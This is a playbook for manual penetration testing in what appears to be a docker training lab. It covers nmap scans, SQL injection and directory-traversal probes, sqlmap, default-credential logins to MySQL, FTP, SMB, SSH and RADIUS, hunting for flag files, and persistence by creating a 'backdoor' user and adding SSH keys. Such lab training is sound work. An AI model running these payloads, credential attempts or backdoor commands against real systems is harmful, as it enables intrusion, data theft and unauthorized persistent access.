# Penetration Test Playbook

This playbook provides step-by-step procedures for manual penetration testing in the lab environment.

## Prerequisites

- Lab environment running (`docker-compose up -d`)
- Access to Kali container: `docker exec -it pentest-kali /bin/bash`
- Traffic capture running (optional but recommended)

## Phase 1: Reconnaissance

### 1.1 Network Discovery

**Objective:** Identify active hosts and network topology

**Steps:**
1. Enter Kali container:
   ```bash
   docker exec -it pentest-kali /bin/bash
   ```

2. Discover hosts on DMZ network:
   ```bash
   nmap -sn 172.21.0.0/24
   ```

3. Discover hosts on Internal network:
   ```bash
   nmap -sn 172.22.0.0/24
   ```

4. Document discovered IPs and their roles

**Expected Results:**
- DMZ: Web server (172.21.0.2), RADIUS server (172.21.0.3)
- Internal: Database (172.22.0.3), File server (172.22.0.4), Linux (172.22.0.5)

**Indicators:**
- ICMP echo replies indicate active hosts
- No response indicates filtered/firewalled hosts

### 1.2 Port Scanning

**Objective:** Identify open ports and services

**Steps:**
1. Comprehensive port scan on web server:
   ```bash
   nmap -sS -sV -O -p- 172.21.0.2
   ```

2. Service version detection:
   ```bash
   nmap -sC -sV 172.21.0.2
   ```

3. Repeat for all discovered hosts

**Expected Results:**
- Web server: Port 80 (HTTP, mapped to host port 8081)
- RADIUS server: Ports 1812/1813 (UDP)
- Database: Port 3306 (MySQL)
- File server: Ports 21 (FTP), 445 (SMB)
- Linux: Port 22 (SSH)

**Indicators:**
- Open ports indicate running services
- Service versions may reveal vulnerabilities

## Phase 2: Vulnerability Assessment

### 2.1 Web Server Assessment

**Objective:** Identify web application vulnerabilities

**Steps:**
1. Access web server:
   ```bash
   curl http://172.21.0.2:80
   ```

2. Test for SQL injection:
   ```bash
   curl "http://172.21.0.2:80/?id=1' OR '1'='1"
   curl "http://172.21.0.2:80/?id=admin'--"
   ```

3. Test for directory traversal:
   ```bash
   curl "http://172.21.0.2:80/?file=../etc/passwd"
   curl "http://172.21.0.2:80/?file=../../etc/passwd"
   ```

4. Check for information disclosure:
   ```bash
   curl -I http://172.21.0.2:80
   curl http://172.21.0.2:80/robots.txt
   ```

**Expected Results:**
- Web server responds with content
- Potential SQL injection or directory traversal vulnerabilities
- Server headers may reveal version information

**Indicators:**
- Error messages containing SQL syntax
- File system access via directory traversal
- Information disclosure in headers/robots.txt

### 2.2 RADIUS Server Assessment

**Objective:** Test RADIUS authentication security

**Steps:**
1. Install RADIUS utilities:
   ```bash
   apt-get update && apt-get install -y freeradius-utils
   ```

2. Test RADIUS authentication:
   ```bash
   radtest guest guest 172.21.0.3 0 schoolradius123
   radtest student01 Student123! 172.21.0.3 0 schoolradius123
   ```

3. Test weak credentials:
   ```bash
   radtest guest01 password 172.21.0.3 0 schoolradius123
   ```

4. Capture RADIUS traffic:
   ```bash
   tcpdump -i any -w radius_capture.pcap port 1812 or port 1813
   ```

**Expected Results:**
- Successful authentication with known credentials
- Failed authentication attempts logged
- RADIUS packets captured for analysis

**Indicators:**
- Access-Accept messages indicate successful authentication
- Access-Reject messages indicate failed attempts
- Weak secrets may allow packet manipulation

### 2.3 Database Assessment

**Objective:** Test MySQL database security

**Steps:**
1. Attempt connection with default credentials:
   ```bash
   mysql -h 172.22.0.3 -u root -proot
   ```

2. If successful, enumerate databases:
   ```sql
   SHOW DATABASES;
   SELECT user, host FROM mysql.user;
   ```

3. Test admin credentials:
   ```bash
   mysql -h 172.22.0.3 -u admin -padmin123
   ```

**Expected Results:**
- Successful connection with weak credentials
- Database enumeration reveals structure
- User accounts visible

**Indicators:**
- Successful MySQL connection
- Database/table enumeration possible
- Weak passwords allow unauthorized access

### 2.4 File Server Assessment

**Objective:** Test FTP and SMB security

**Steps:**
1. Test FTP anonymous access:
   ```bash
   ftp 172.22.0.4
   # Username: anonymous
   # Password: (empty)
   ```

2. Test FTP with credentials:
   ```bash
   ftp 172.22.0.4
   # Username: ftpuser
   # Password: password123
   ```

3. Test SMB access:
   ```bash
   smbclient //172.22.0.4/shared -U smbuser
   # Password: smbuser
   ```

4. List shares:
   ```bash
   smbclient -L //172.22.0.4 -U smbuser
   ```

**Expected Results:**
- Anonymous FTP access may be available
- Weak credentials allow access
- File shares accessible

**Indicators:**
- Successful FTP/SMB login
- File listing and download possible
- Write access may be available

### 2.5 SSH Assessment

**Objective:** Test SSH security

**Steps:**
1. Attempt SSH connection:
   ```bash
   ssh admin@172.22.0.5
   # Password: admin123
   ```

2. Test other credentials:
   ```bash
   ssh root@172.22.0.5
   # Password: root123
   ```

3. Check for passwordless sudo:
   ```bash
   sudo -l
   ```

**Expected Results:**
- Successful SSH login with weak credentials
- Potential privilege escalation opportunities

**Indicators:**
- Successful SSH authentication
- Sudo privileges available
- Root access possible

## Phase 3: Exploitation

### 3.1 Web Server Exploitation

**Objective:** Exploit web vulnerabilities

**Steps:**
1. If SQL injection found, extract data:
   ```bash
   sqlmap -u "http://172.21.0.2:80/?id=1" --dbs
   sqlmap -u "http://172.21.0.2:80/?id=1" -D database_name --tables
   ```

2. If directory traversal found, access files:
   ```bash
   curl "http://172.21.0.2:80/?file=../../../etc/passwd"
   ```

**Expected Results:**
- Database enumeration
- File system access
- Sensitive data extraction

### 3.2 Lateral Movement

**Objective:** Move from initial access to other systems

**Steps:**
1. From web server, scan internal network:
   ```bash
   # If web server compromised, use it as pivot
   nmap -sn 172.22.0.0/24
   ```

2. Access database from internal network:
   ```bash
   mysql -h 172.22.0.3 -u root -proot
   ```

3. Access file server:
   ```bash
   smbclient //172.22.0.4/shared -U smbuser
   ```

**Expected Results:**
- Network access from compromised host
- Additional systems compromised
- Privilege escalation

## Phase 4: Post-Exploitation

### 4.1 Data Collection

**Objective:** Collect flags and sensitive data

**Steps:**
1. Search for flag files:
   ```bash
   find / -name "*flag*" 2>/dev/null
   ```

2. Check common locations:
   ```bash
   cat /home/admin/flag.txt
   cat /root/root_flag.txt
   cat /shared/flag.txt
   ```

**Expected Results:**
- Flag files found
- Sensitive data collected

### 4.2 Persistence

**Objective:** Establish persistent access

**Steps:**
1. Create backdoor user:
   ```bash
   useradd -m -s /bin/bash backdoor
   echo "backdoor:password123" | chpasswd
   ```

2. Add SSH key:
   ```bash
   mkdir -p ~/.ssh
   echo "ssh-rsa ..." >> ~/.ssh/authorized_keys
   ```

**Expected Results:**
- Persistent access established
- Multiple entry points created

## Phase 5: Reporting

### 5.1 Document Findings

**Objective:** Create comprehensive report

**Steps:**
1. Document all vulnerabilities found
2. Include proof-of-concept commands
3. Include screenshots/captures
4. Prioritize by severity
5. Provide remediation recommendations

**Expected Results:**
- Complete penetration test report
- Actionable recommendations
- Evidence of vulnerabilities

## Attack Scenarios Summary

### Scenario 1: External Web Attack
1. Discover web server (172.21.0.2:80)
2. Identify SQL injection vulnerability
3. Extract database credentials
4. Use credentials to access database
5. Extract sensitive data

### Scenario 2: Credential Compromise
1. Discover SSH service (172.22.0.5:22)
2. Brute force weak credentials
3. Gain initial access
4. Escalate privileges
5. Access other systems

### Scenario 3: RADIUS Attack
1. Discover RADIUS server (172.21.0.3:1812)
2. Test weak RADIUS secret
3. Compromise guest credentials
4. Attempt VLAN hopping
5. Gain network access

### Scenario 4: File Server Compromise
1. Discover FTP service (172.22.0.4:21)
2. Access via anonymous FTP
3. Upload malicious file
4. Execute via web server
5. Gain shell access

## Notes

- Always capture traffic during testing
- Document all commands and results
- Test in isolated lab environment only
- Follow responsible disclosure practices
